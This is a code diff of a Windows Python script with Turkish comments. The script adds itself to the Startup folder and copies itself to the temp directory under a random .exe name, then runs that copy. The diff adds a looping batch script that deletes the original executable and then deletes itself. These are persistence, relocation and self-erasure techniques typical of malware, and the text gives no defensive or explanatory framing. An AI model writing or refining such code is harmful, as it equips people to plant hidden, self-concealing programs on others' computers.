@@ -8,11 +8,12 @@ import winshell
 import win32com.client
 import tkinter as tk
 from threading import Timer
+import subprocess
 
 def add_desktop_script_to_startup():
     # Masaüstü klasörünün yolunu alın
     desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-    script_path = os.path.abspath(sys.argv[0])  # Dosya adı "protV1.py" olarak varsayıldı
+    script_path = os.path.abspath(sys.argv[0])  # Çalışan dosyanın tam yolu
 
     # Başlangıç klasörünün yolunu al
     startup_folder = winshell.startup()
@@ -24,8 +25,7 @@ def add_desktop_script_to_startup():
         # Windows Shell'i kullanarak kısayolu oluştur
         shell = win32com.client.Dispatch("WScript.Shell")
         shortcut = shell.CreateShortcut(shortcut_path)
-        shortcut.TargetPath = sys.executable  # Python çalıştırıcısının yolu
-        shortcut.Arguments = f'"{script_path}"'
+        shortcut.TargetPath = script_path  # Çalışan exe dosyasının yolu
         shortcut.WorkingDirectory = desktop_path
         shortcut.save()
 
@@ -51,21 +51,35 @@ def show_welcome_message():
     root.mainloop()
 
 def copy_and_run_self():
-    # Geçici bir dosya oluştur
+    # Çalışan dosyanın tam yolunu al
+    current_file = sys.argv[0]
+
+    # Geçici bir klasör seç ve rastgele dosya adı oluştur
     temp_dir = tempfile.gettempdir()
-    random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".py"
-    temp_script_path = os.path.join(temp_dir, random_filename)
+    random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".exe"
+    temp_file = os.path.join(temp_dir, random_filename)
 
-    # Kendini kopyala
-    shutil.copyfile(sys.argv[0], temp_script_path)
+    # Dosyayı geçici klasöre kopyala
+    shutil.copyfile(current_file, temp_file)
 
-    # Geçici dosyayı çalıştır
-    os.startfile(temp_script_path)
+    # Yeni dosyayı çalıştır
+    subprocess.Popen(temp_file, shell=True)
 
-    # Kendini sil
-    os.remove(sys.argv[0])
+    # Kendini silmek için bir batch script oluştur
+    batch_script = os.path.join(temp_dir, "delete_self.bat")
+    with open(batch_script, "w") as bat:
+        bat.write(f"""
+        @echo off
+        :loop
+        del "{current_file}" >nul 2>nul
+        if exist "{current_file}" goto loop
+        del "%~f0" >nul 2>nul
+        """)
 
-# Kısayolu başlangıç klasörüne ekleyin
+    # Batch script'i çalıştır
+    subprocess.Popen(batch_script, shell=True)
+
+# Başlangıç klasörüne kısayolu ekleyin
 add_desktop_script_to_startup()
 
 # Kendini kopyala ve çalıştır
